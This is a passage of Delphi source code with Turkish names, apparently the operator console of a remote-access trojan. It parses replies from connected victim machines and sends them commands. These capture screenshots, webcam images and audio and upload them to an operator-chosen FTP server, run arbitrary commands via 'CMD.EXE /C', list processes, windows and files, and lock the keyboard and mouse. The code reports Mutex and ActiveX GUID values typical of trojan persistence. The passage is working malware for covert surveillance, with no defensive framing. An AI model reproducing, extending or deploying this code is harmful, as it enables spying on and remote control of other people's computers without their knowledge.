if copy(cevap,1,2) = '44' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[64],1);
goto son;
end;

if copy(cevap,1,2) = '45' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[65]+cevap,1);
goto son;
end;

if copy(cevap,1,2) = '46' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[66]+cevap,1);
goto son;
end;

if copy(cevap,1,2) = '47' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[67],1);
goto son;
end;

if copy(cevap,1,2) = '48' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[68]+cevap;
goto son;
end;
label14.Caption:=cmesaj[68]+cevap;
goto son;
end;

if copy(cevap,1,2) = '49' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[69]+cevap;
goto son;
end;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[69]+cevap;
goto son;
end;

if copy(cevap,1,2) = '50' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[70],1);
goto son;
end;

if copy(cevap,1,2) = '51' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[71],1);
goto son;
end;

if copy(cevap,1,2) = '52' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[72],1);
goto son;
end;

if copy(cevap,1,2) = '53' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[73]+cevap,1);
goto son;
end;

if copy(cevap,1,2) = '54' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[74],1);
goto son;
end;

if copy(cevap,1,2) = '55' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[75],1);
goto son;
end;

if copy(cevap,1,2) = '56' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[76],1);
goto son;
end;

if copy(cevap,1,2) = '57' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[77],1);
goto son;
end;

if copy(cevap,1,2) = '58' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[78]+cevap,1);
goto son;
end;

if copy(cevap,1,2) = '59' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cevap+cmesaj[79];
goto son
end;
label14.Caption:=cevap+cmesaj[79];
goto son;
end;

if copy(cevap,1,2) = '60' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[80];
goto son
end;
label14.Caption:=cmesaj[80];
goto son;
end;

if copy(cevap,1,2) = '61' then begin
delete(cevap, 1, 3);
if flatcheckbox11.checked then PlayWavFile('efekt1');
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cevap+cmesaj[81];
goto son
end;
label14.Caption:=cevap+cmesaj[81];
goto son;
end;

if copy(cevap,1,2) = '62' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[82];
goto son
end;
label14.Caption:=cmesaj[82];
goto son;
end;

if copy(cevap,1,2) = '63' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[83]+cevap;
goto son
end;
label14.Caption:=cmesaj[83]+cevap;
goto son;
end;

if copy(cevap,1,2) = '64' then begin
delete(cevap, 1, 3);
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[84];
goto son
end;
bilgi(cmesaj[85],1);
goto son;
end;

if copy(cevap,1,2) = '65' then begin
delete(cevap, 1, 3);
if flatcheckbox11.checked then PlayWavFile('efekt1');
if form2.Active then begin
form2.StatusBar1.Panels[0].Text:=cmesaj[86];
goto son
end;
bilgi(cmesaj[86],1);
goto son;
end;

if copy(cevap,1,2) = '66' then begin
delete(cevap, 1, 3);
if flatcheckbox11.checked then PlayWavFile('efekt2');
bilgi(cmesaj[87]+cevap,1);
goto son;
end;

if copy(cevap,1,2) = '67' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[88],1);
goto son;
end;

if copy(cevap,1,2) = '68' then begin
delete(cevap, 1, 3);
bilgi(cmesaj[89],2);
label14.font.Color:=cllime;
butonac;
label14.Caption:=cmesaj[90];
goto son;
end;

goto son;
end;

if copy (cevap, 1, 5)='+alj=' then begin
delete(cevap, 1, 5);
randomize;
if form1.FlatCheckBox18.Checked then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/FTP '+parcala(cevap,0)+'|'+form1.flatedit3.Text+'|'+form1.flatedit8.Text+'|'+form1.flatedit4.Text+'|'+form1.flatedit5.Text+'|.');
goto son;
end;

if destek.aktif then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/FTP '+parcala(cevap,0)+'|'+destek.ip+'|21|'+destek.kullanici+'|'+destek.sifre+'|.');
goto son;
end;

ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DYUKLE '+parcala(cevap,0)+'|'+'ekran'+inttostr(random(995929))+'.jpg'+'|.');
goto son;
end;

if copy (cevap, 1, 5)='+alc=' then begin
delete(cevap, 1, 5);
randomize;
if form1.FlatCheckBox18.Checked then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/FTP '+parcala(cevap,0)+'|'+form1.flatedit3.Text+'|'+form1.flatedit8.Text+'|'+form1.flatedit4.Text+'|'+form1.flatedit5.Text+'|.');
goto son;
end;
if destek.aktif then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/FTP '+parcala(cevap,0)+'|'+destek.ip+'|21|'+destek.kullanici+'|'+destek.sifre+'|.');
goto son;
end;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DYUKLE '+parcala(cevap,0)+'|'+'cam'+inttostr(random(995929))+'.jpg'+'|.');
goto son;
end;

if copy (cevap, 1, 5)='+als=' then begin
delete(cevap, 1, 5);
randomize;
if form1.FlatCheckBox18.Checked then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/FTP '+parcala(cevap,0)+'|'+form1.flatedit3.Text+'|'+form1.flatedit8.Text+'|'+form1.flatedit4.Text+'|'+form1.flatedit5.Text+'|.');
goto son;
end;
if destek.aktif then begin
form1.ServerSocket1.Socket.connections[strtoint(form1.flatedit9.text)].SendText('/FTP '+parcala(cevap,0)+'|'+destek.ip+'|21|'+destek.kullanici+'|'+destek.sifre+'|.');
goto son;
end;
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DYUKLE '+parcala(cevap,0)+'|'+'ses'+inttostr(random(995929))+'.wav'+'|.');
goto son;
end;

if copy (cevap, 1, 4)='+ADZ' then begin
delete(cevap, 1, 4);
if flatcheckbox5.Checked then begin
bilgi(cmesaj[91]+parcala(cevap,0),1);
goto son;
end;

form2.StatusBar1.Panels[0].Text:=parcala(cevap,0);
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/LS');
goto son;
end;

if copy (cevap, 1, 7)='+msonuc' then begin
delete(cevap, 1, 8);
bilgi(cmesaj[92]+parcala(cevap,0)+' / '+hocayadanis(parcala(cevap,1)),1);
goto son;
end;

if copy (cevap, 1, 7)='+hbilgi' then begin
delete(cevap, 1, 8);
if flatcheckbox5.Checked then begin
konsolabasargibi;
Memo1.Lines.Add('*********************************************');
Memo1.Lines.Add(cmesaj[93]+parcala(cevap,0));
Memo1.Lines.Add(cmesaj[94]+parcala(cevap,1));
Memo1.Lines.Add(cmesaj[95]+parcala(cevap,2));
goto son;
end;
form2.Memo1.Clear;
form2.Memo1.Lines.Add(cmesaj[93]+copy(parcala(cevap,0),1,1));
form2.Memo1.Lines.Add(cmesaj[94]+parcala(cevap,1));
form2.Memo1.Lines.Add(cmesaj[95]+parcala(cevap,2));
goto son;
end;

if copy (cevap, 1, 8)='+kbilgi=' then begin
delete(cevap, 1, 8);
if flatcheckbox5.Checked then begin
try
konsolabasargibi;
Memo1.Lines.Add('*********************************************');
Memo1.Lines.Add(cmesaj[96]+(parcala(cevap,0)));
DB:=strtoint(parcala(cevap,1));

if DB < 1024 then begin
Memo1.Lines.Add(cmesaj[97]+inttostr((DB))+' bayt');
goto bura3;
end;

if DB > 1048576 then begin
db2:=db div 1024;
Memo1.Lines.Add(cmesaj[97]+inttostr(DB div 1024 div 1024)+','+copy(inttostr(db2 mod 1024),1,1)+' mb');
goto bura3;
end;

Memo1.Lines.Add(cmesaj[97]+inttostr(DB div 1024)+' kb');
bura3:
Memo1.Lines.Add('*********************************************');
finally;
end;
GOTO SON;
end;

try
form2.Memo1.Clear;
form2.Memo1.Lines.Add(parcala(cevap,0));
form2.Memo1.Lines.add('******************');
DB:=strtoint(parcala(cevap,1));

if DB < 1024 then begin
form2.Memo1.Lines.Add(cmesaj[97]+inttostr((DB))+' bayt');
goto bura4;
end;

if DB > 1048576 then begin
db2:=db div 1024;
form2.Memo1.Lines.Add(cmesaj[97]+inttostr(DB div 1024 div 1024)+','+copy(inttostr(db2 mod 1024 mod 1024),1,1)+' mb');
goto bura4;
end;

form2.Memo1.Lines.Add(cmesaj[97]+inttostr(DB div 1024)+' kb');
bura4:
finally;
end;
goto son;
end;

if copy (cevap, 1, 8)='+dbilgi=' then begin
delete(cevap, 1, 8);
if flatcheckbox5.Checked then begin
try
konsolabasargibi;
Memo1.Lines.Add('*********************************************');
Memo1.Lines.Add(cmesaj[98]+(parcala(cevap,0)));
Memo1.Lines.Add(cmesaj[97]+boyutyorumla(parcala(cevap,1)));
bura2:

for dt:=2 to 4 do begin
if dt=2 then Memo1.Lines.Add(cmesaj[99]+parcala(cevap,dt));
if dt=3 then Memo1.Lines.Add(cmesaj[100]+parcala(cevap,dt));
if dt=4 then Memo1.Lines.Add(cmesaj[101]+parcala(cevap,dt));
end;
Memo1.Lines.Add('*********************************************');
finally;
end;
GOTO SON;
end;

try
form2.Memo1.Clear;
form2.Memo1.Lines.Add(parcala(cevap,0));
form2.Memo1.Lines.add('******************');
form2.Memo1.Lines.Add(cmesaj[97]+boyutyorumla(parcala(cevap,1)));
bura:
for dt:=2 to 4 do begin
if dt=2 then form2.Memo1.Lines.Add(cmesaj[99]+parcala(cevap,dt));
if dt=3 then form2.Memo1.Lines.Add(cmesaj[100]+parcala(cevap,dt));
if dt=4 then form2.Memo1.Lines.Add(cmesaj[101]+parcala(cevap,dt));
end;
finally;
end;
goto son;
end;

if copy (cevap, 1, 4)='+cvp' then begin
delete(cevap, 1, 4);
cevap:=parcala(cevap,0);
lag:=gettickcount - strtoint(cevap);
Label14.Caption:='Lag : '+inttostr(lag)+' ms';
GOTO SON
end;

if copy (cevap, 1, 7)='+sbilgi' then begin
konsolabasargibi;
Memo1.Lines.Add('*********************************************');
for xx:=1 to 9 do begin
if xx=1 then Memo1.Lines.Add(cmesaj[102]+parcala(cevap,xx));
if xx=2 then Memo1.Lines.Add(cmesaj[103]+parcala(cevap,xx));
if xx=3 then Memo1.Lines.Add(cmesaj[104]+parcala(cevap,xx));
if xx=4 then Memo1.Lines.Add(cmesaj[105]+parcala(cevap,xx));
if xx=5 then Memo1.Lines.Add(cmesaj[106]+hocayadanis(parcala(cevap,xx)));
if xx=6 then Memo1.Lines.Add(cmesaj[107]+hocayadanis(parcala(cevap,xx)));
if xx=7 then Memo1.Lines.Add(cmesaj[108]+hocayadanis(parcala(cevap,xx)));
if xx=8 then Memo1.Lines.Add(cmesaj[109]+parcala(cevap,xx));
if xx=9 then Memo1.Lines.Add(cmesaj[110]+parcala(cevap,xx));
end;
Memo1.Lines.Add('*********************************************');
GOTO SON
end;

if copy (cevap, 1, 7)='+gbilgi' then begin
konsolabasargibi;
Memo1.Lines.Add('*********************************************');
for xx:=1 to 5 do begin
if xx=1 then Memo1.Lines.Add(cmesaj[111]+parcala(cevap,xx));
if xx=2 then Memo1.Lines.Add(cmesaj[112]+hocayadanis(parcala(cevap,xx)));
if xx=3 then Memo1.Lines.Add(cmesaj[113]+parcala(cevap,xx));
if xx=4 then Memo1.Lines.Add(cmesaj[114]+hesapla(strtoint(parcala(cevap,xx))));
if xx=5 then Memo1.Lines.Add('Idle : '+hesapla(strtoint(parcala(cevap,xx))));
end;
Memo1.Lines.Add('*********************************************');
GOTO SON
end;

if copy (cevap, 1, 6)='+tanim' then begin
konsolabasargibi;
Memo1.Lines.Add('****************************************');
for yy:=1 to 12 do begin
if yy=1 then Memo1.Lines.Add(cmesaj[115]+parcala(cevap,yy));
if yy=2 then Memo1.Lines.Add(cmesaj[116]+parcala(cevap,yy));
if yy=3 then Memo1.Lines.Add(cmesaj[117]+parcala(cevap,yy));
if yy=4 then Memo1.Lines.Add(cmesaj[118]+parcala(cevap,yy));
if yy=5 then Memo1.Lines.Add('Mutex : '+parcala(cevap,yy));
if yy=6 then Memo1.Lines.Add('Activex Guid : '+parcala(cevap,yy));
if yy=7 then Memo1.Lines.Add(cmesaj[119]+kuryorumla(parcala(cevap,yy)));
if yy=8 then Memo1.Lines.Add(cmesaj[120]+parcala(cevap,yy)+'b');
if yy=9 then Memo1.Lines.Add(cmesaj[121]+parcala(cevap,yy)+' mb');
if yy=10 then Memo1.Lines.Add(cmesaj[122]+copy(parcala(cevap,yy),1,2)+' sn');
if yy=11 then Memo1.Lines.Add(cmesaj[123]+parcala(cevap,yy)+' ms');
if yy=12 then Memo1.Lines.Add(cmesaj[124]+parcala(cevap,yy));
end;
Memo1.Lines.Add('****************************************');
GOTO SON
end;

if copy (cevap, 1, 9)='+islemler' then begin

if flatcheckbox5.Checked then begin
konsolabasargibi;
Memo1.Lines.Add('****************************************');
islemsayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add(cmesaj[125]+inttostr(islemsayisi));
for kk:=1 to islemsayisi do begin
Memo1.Lines.Add(parcala(cevap,kk));
end;
Memo1.Lines.Add('****************************************');
GOTO SON
end;

basargibi1;
ListBox1.Clear;
islemsayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
label14.Font.Color:=cllime;
label14.caption:=cmesaj[125]+inttostr(islemsayisi);
for kk:=1 to islemsayisi do begin
listbox1.items.add(parcala(cevap,kk));
end;

GOTO SON;
end;

if copy (cevap, 1, 7)='+klasor' then begin
if flatcheckbox5.Checked then begin
konsolabasargibi;
Memo1.Lines.Add('****************************************');
ksayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add(cmesaj[126]+inttostr(ksayisi));

for hh:=1 to ksayisi do begin
Memo1.Lines.Add(parcala(cevap,hh));
end;

delete(cevap, 1, pos('+dosya', cevap)-1);
Memo1.Lines.Add('---------------');

if copy (cevap, 1, 6)='+dosya' then begin
dsayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add(cmesaj[127]+inttostr(dsayisi));
for zz:=1 to dsayisi do begin
Memo1.Lines.Add(parcala(cevap,zz));
end;
Memo1.Lines.Add('****************************************');
GOTO SON
end;
end;

if not form2.Visible then form2.Visible:=true;
form2.ListView1.PopupMenu:=form2.popupmenu1;
sahnedeki:='dosyalar';
form2.ListView1.ViewStyle:=vsicon;
form2.ListView1.Clear;
ksayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
form2.ListView1.Items.BeginUpdate;
if ksayisi=0 then goto katla;
form2.Gauge1.MaxValue:=ksayisi;
calisiomlagn:=true;
for g1:= 1 to ksayisi do begin
if yorumlaiptal then begin
yorumlaiptal:=False;
break;
end;
ListItem := form2.ListView1.Items.Add;
listitem.ImageIndex:=0;
listitem.Caption:=parcala(cevap,g1);
form2.Gauge1.Progress:=g1;
if form1.flatcheckbox4.checked then delay(1);
end;
calisiomlagn:=false;
katla:
delete(cevap, 1, pos('+dosya', cevap)-1);
if copy (cevap, 1, 6)='+dosya' then begin
dsayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));

if dsayisi=0 then begin
if ksayisi < 2 then begin
form2.StatusBar1.Panels[1].Text:=cmesaj[128];
end;
goto datla;
end;

form2.Gauge1.MaxValue:=dsayisi;
calisiomlagn:=true;
for g2:=1 to dsayisi do begin
if yorumlaiptal then begin
yorumlaiptal:=False;
break;
end;

ListItem := form2.ListView1.Items.Add;
listitem.Caption:=parcala(cevap,g2);
ListItem.ImageIndex := cins(listitem.Caption);
form2.Gauge1.progress:=g2;
if form1.FlatCheckBox4.Checked then delay(1);
end;
end;
calisiomlagn:=false;
if form2.flatcheckbox3.Checked then form2.ListView1.CustomSort(@CustomSortProc, 0);
form2.ListView1.ItemIndex:=0;
if form2.ListView1.Items.Item[0].Caption='.' then ksayisi:=ksayisi-2;
form2.StatusBar1.Panels[1].Text:=inttostr(dsayisi)+cmesaj[129]+inttostr(ksayisi)+cmesaj[130];
datla:
form2.ListView1.Items.EndUpdate;
goto son;
end;

if copy (cevap, 1, 4)='+src' then begin

if flatcheckbox5.Checked then begin
konsolabasargibi;
Memo1.Lines.Add('****************************************');
hdd:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add(cmesaj[131]+inttostr(hdd));
for ii:=1 to hdd do begin
Memo1.Lines.Add(copy(parcala(cevap,ii),1,3));
end;
Memo1.Lines.Add('****************************************');
GOTO SON
end;

ssayisi:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
if not form2.Visible then form2.Visible:=True;
form2.ListView1.PopupMenu:=form2.popupmenu2;
sahnedeki:='hdd';
form2.ListView1.Clear;
form2.Gauge1.MaxValue:=ssayisi;
form2.ListView1.Items.BeginUpdate;
form2.ListView1.ViewStyle:=vslist;
for x2:= 1 to ssayisi do begin
ListItem := form2.ListView1.Items.Add;
stt:=parcala(cevap,x2);
listitem.Caption:=copy(stt,1,3);
delete(stt,1,3);
ListItem.ImageIndex := hddturu(listitem.caption,stt);
listitem.Caption:=' '+listitem.Caption+'  -  '+mturu(stt);
form2.Gauge1.Progress:=x2;
if flatcheckbox4.Checked then delay(1);
end;
form2.StatusBar1.Panels[0].Text:=cmesaj[132]+inttostr(ssayisi)+cmesaj[133];
form2.StatusBar1.Panels[1].Text:='';
form2.ListView1.Items.EndUpdate;
goto son;
end;

if copy (cevap, 1, 8)='+mekan01' then begin
delete(cevap,1,8);
if not form2.Visible then form2.Visible:=True;
form2.ListView1.Items.beginupdate;
form2.ListView1.PopupMenu:=nil;
form2.ListView1.ViewStyle:=vslist;
sahnedeki:='mekan1';
form2.ListView1.Clear;
form2.Gauge1.MaxValue:=2;
for x2:= 0 to 2 do begin
ListItem := form2.ListView1.Items.Add;
listitem.ImageIndex:=29;
listitem.Caption:=parcala(cevap,x2);
form2.Gauge1.Progress:=x2;
end;
form2.StatusBar1.Panels[0].Text:=cmesaj[134];
form2.StatusBar1.Panels[1].Text:='';
form2.ListView1.Items.EndUpdate;
goto son;
end;

if copy (cevap, 1, 8)='+mekan02' then begin
delete(cevap,1,8);
if not form2.Visible then form2.Visible:=True;
form2.ListView1.Items.beginupdate;
form2.ListView1.PopupMenu:=nil;
form2.ListView1.ViewStyle:=vslist;
sahnedeki:='mekan2';
form2.ListView1.Clear;
form2.Gauge1.MaxValue:=6;
for x2:= 1 to 6 do begin
ListItem := form2.ListView1.Items.Add;
if x2=1 then listitem.ImageIndex:=23;
if x2=2 then listitem.ImageIndex:=24;
if x2=3 then listitem.ImageIndex:=25;
if x2=4 then listitem.ImageIndex:=26;
if x2=5 then listitem.ImageIndex:=27;
if x2=6 then listitem.ImageIndex:=28;
listitem.Caption:=hocayadanis(parcala(cevap,x2));
form2.Gauge1.Progress:=x2;
end;
form2.StatusBar1.Panels[0].Text:=cmesaj[135];
form2.StatusBar1.Panels[1].Text:='';
form2.ListView1.Items.EndUpdate;
goto son;
end;

if copy (cevap, 1,9)='X+pencere' then begin
konsolabasargibi;
Memo1.Lines.Add('****************************************');
pnc:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add(cmesaj[136]+inttostr(pnc));
for tt:=1 to pnc do begin
Memo1.Lines.Add(parcala(cevap,tt));
end;
Memo1.Lines.Add('****************************************');
GOTO SON;
end;

if copy (cevap, 1, 8)='+pencere' then begin

if flatcheckbox5.Checked then begin
konsolabasargibi;
Memo1.Lines.Add('****************************************');
pnc:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
Memo1.Lines.Add(cmesaj[136]+inttostr(pnc));
for tt:=1 to pnc do begin
Memo1.Lines.Add(parcala(cevap,tt));
end;
Memo1.Lines.Add('****************************************');
GOTO SON;
end;

basargibi2;
ListBox2.Clear;
pnc:=strtoint(copy(cevap, pos(':',cevap)+1, pos('|',cevap)-pos(':',cevap)-1));
label14.Font.Color:=cllime;
label14.caption:=cmesaj[137]+inttostr(pnc);
for tt:=1 to pnc do begin
listbox2.items.add(parcala(cevap,tt));
end;
goto son;
end;

bilgi(cevap,1);
end;

SON:
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
try
if flatcheckbox14.Checked then ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DOS CMD.EXE /C '+flatedit2.text+'|.');
if flatcheckbox1.Checked then ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/'+flatedit2.text);
if not flatcheckbox1.Checked then ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText(flatedit2.text);
flatEdit2.Clear;
except on exception do exit;
end;
end;

procedure TForm1.ServerSocket1ClientDisconnect(Sender: TObject;Socket: TCustomWinSocket);
var
i:integer;
begin
yetkili[socket.SocketHandle]:=false;
bagnanan:=bagnanan-1;
label14.Font.Color:=clred;
label14.Caption:=cmesaj[138]+socket.RemoteAddress;

if serversocket1.Socket.ActiveConnections = 0 then butonkapa;

try
for i := 0 to listview1.Items.Count -1 do begin
if listview1.Items[i].Caption = inttostr(socket.SocketHandle) then listview1.items[i].Delete;
end;
except on exception do exit;
end;

end;

procedure TForm1.Edit2KeyDown(Sender: TObject; var Key: Word;Shift: TShiftState);
label
sson;
begin
if flatedit2.Text='' then exit;
if flatedit2.Text=' ' then exit;

if (key = 13) then begin

if flatcheckbox14.Checked then begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DOS CMD.EXE /C '+flatedit2.text+'|.');
goto sson;
end;

if shift = [ssShift] then begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/DOS '+flatedit2.Text+'|.');
goto sson;
end;

if flatcheckbox1.Checked then ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/'+flatedit2.text);
if not flatcheckbox1.Checked then ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText(flatedit2.text);

sson:
flatedit2.Clear;
key:=0;
end;
end;

procedure TForm1.FlatButton3Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/XTL');
end;

procedure TForm1.FlatButton4Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/PRG');
end;

procedure TForm1.FlatButton5Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/TL');
end;

procedure TForm1.FlatButton6Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/APENC');
end;

procedure TForm1.FlatButton8Click(Sender: TObject);
var
i:integer;
portlar:string;
label
hede;
begin

pcevap:='';

if not serversocket1.Active then begin
if flatcheckbox3.Checked then desteklebeni;
Serversocket1.Port := strtoint(flatedit6.Text);
serversocket1.Active := true;
ftpserver1.ServSocket.MultiThreaded:=true;
ftpserver1.Start;

if flatlistbox1.Items.Count > 0 then begin
portmap.MappedPort:=Serversocket1.Port;
portmap.Bindings.Add.IP:=serversocket1.Socket.LocalAddress;
for i:=0 to flatlistbox1.Items.Count - 1 do begin
portmap.Bindings.Add.Port:=strtoint(Flatlistbox1.Items.Strings[i]);
portlar:=portlar+Flatlistbox1.Items.Strings[i]+', ';
end;
portmap.Active:=true;
bilgi(cmesaj[139]+copy(portlar,1,length(portlar)-2),1);
end;
label14.Font.Color:=clyellow;
flatedit6.enabled:=false;
flatedit1.Enabled:=false;
label14.caption:=cmesaj[140];
if flatcheckbox13.Checked then logsakla;
flatedit9.Text:='0';
Flatbutton8.Caption:=duruntu;
goto hede;
end;

if serversocket1.Active then begin
serversocket1.Active := false;
ftpserver1.DisconnectAll;
ftpserver1.Stop;
ftpserver1.Active:=False;
portmap.Active:=false;
flatedit6.enabled:=true;
flatedit1.Enabled:=true;
if flatcheckbox13.Checked then logsakla;
label14.caption:='';
Label14.Font.Color:=cllime;
bagliolan:=0;
Flatbutton8.Caption:=basinti;
flatedit9.Text:='0';
listview1.Clear;
listview3.Clear;
butonkapa;
end;

hede:
end;

procedure TForm1.FlatButton9Click(Sender: TObject);
begin
if panel17.Visible then oglkapat;
form1.Destroy
end;

procedure TForm1.FlatButton10Click(Sender: TObject);
var
vs:integer;
merkes:string;
label
cart;
begin
merkes:='-';
if flatcheckbox8.Checked then merkes:='X';
if length(flatedit19.text) > 3 then begin
vs:=18;
goto cart;
end;

vs:=strtoint(flatedit19.Text);

cart:
PrintInCoordinate(flatedit11.Text,strtoint(flatedit13.Text),strtoint(flatedit14.text),vs,strtoint(flatedit15.Text),strtoint(flatedit16.Text),merkes);
end;

procedure TForm1.FlatButton11Click(Sender: TObject);
var
vs:integer;
merkez,krd:string;
label
cart;
begin
krd:=flatedit13.Text+' x '+flatedit14.Text;
merkez:='-';

if flatcheckbox8.Checked then begin
merkez:='X';
krd:='Merkez';
end;

if length(flatedit19.text) > 3 then begin
vs:=18;
goto cart;
end;

vs:=strtoint(flatedit19.Text);
cart:
if flatcheckbox2.Checked then if not onayla(cmesaj[141]+flatedit11.Text+#13#10+cmesaj[142]+inttostr(vs)+#13#10+cmesaj[143]+krd) then exit;

if flatcheckbox16.Checked then begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/EASIL '+flatedit11.Text+'|'+flatedit13.text+'|'+flatedit14.text+'|'+inttostr(vs)+'|'+flatedit15.text+'|'+flatedit16.text+'|'+merkez+'|.');
exit;
end;

ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/ESICH '+flatedit11.Text+'|'+flatedit13.text+'|'+flatedit14.text+'|'+inttostr(vs)+'|'+flatedit15.text+'|'+flatedit16.text+'|'+merkez+'|.');
end;

procedure TForm1.FlatButton12Click(Sender: TObject);
begin
flatbutton12.ColorBorder:=clmaroon;
flatbutton13.ColorBorder:=cllime;
flatbutton14.ColorBorder:=cllime;
flatbutton19.ColorBorder:=cllime;

flatbutton12.Colorfocused:=clmaroon;
flatbutton13.Colorfocused:=clgreen;
flatbutton14.Colorfocused:=clgreen;
flatbutton19.Colorfocused:=clgreen;

panel10.visible:=false;
panel11.visible:=false;
panel5.visible:=true;
panel9.visible:=false;
panel12.visible:=false;
end;

procedure TForm1.FlatButton13Click(Sender: TObject);
begin
flatbutton12.ColorBorder:=cllime;
flatbutton13.ColorBorder:=clmaroon;
flatbutton14.ColorBorder:=cllime;
flatbutton19.ColorBorder:=cllime;

flatbutton12.Colorfocused:=clgreen;
flatbutton13.Colorfocused:=clmaroon;
flatbutton14.Colorfocused:=clgreen;
flatbutton19.Colorfocused:=clgreen;

panel10.visible:=false;
panel11.visible:=false;
panel5.visible:=false;
panel9.visible:=true;
panel12.visible:=false;
end;

procedure TForm1.FlatButton15Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/GBILGI');
end;

procedure TForm1.FlatButton16Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/TANIMLA');
end;

procedure TForm1.FlatButton19Click(Sender: TObject);
begin
flatbutton12.ColorBorder:=cllime;
flatbutton13.ColorBorder:=cllime;
flatbutton14.ColorBorder:=cllime;
flatbutton19.ColorBorder:=clmaroon;

flatbutton12.Colorfocused:=clgreen;
flatbutton13.Colorfocused:=clgreen;
flatbutton14.Colorfocused:=clgreen;
flatbutton19.Colorfocused:=clmaroon;

panel10.visible:=true;
panel11.visible:=false;
panel5.visible:=false;
panel9.visible:=false;
panel12.visible:=false;
end;

procedure TForm1.FlatButton17Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/SC|'+inttostr(trackbar1.Position)+'|.');
end;

procedure TForm1.FlatButton18Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/CC|'+inttostr(trackbar1.Position)+'|.');
end;

procedure TForm1.FlatButton20Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/KILITAC');
end;

procedure TForm1.FlatButton21Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/KILITLE');
end;

procedure TForm1.FlatButton22Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/AKLIT');
end;

procedure TForm1.FlatButton23Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/AAC');
end;

procedure TForm1.FlatButton26Click(Sender: TObject);
begin
ServerSocket1.Socket.connections[strtoint(flatedit9.text)].SendText('/FARE AC'+'|.');
end;

procedure TForm1.FlatButton28Click(Sender: TObject);
begin
flatbutton30.ColorBorder:=clblack;
flatbutton28.ColorBorder:=clred;
flatbutton35.ColorBorder:=clblack;
flatbutton32.ColorBorder:=clblack;
end;

procedure TForm1.FlatButton29Click(Sender: TObject);
begin

if panel17.Visible then begin
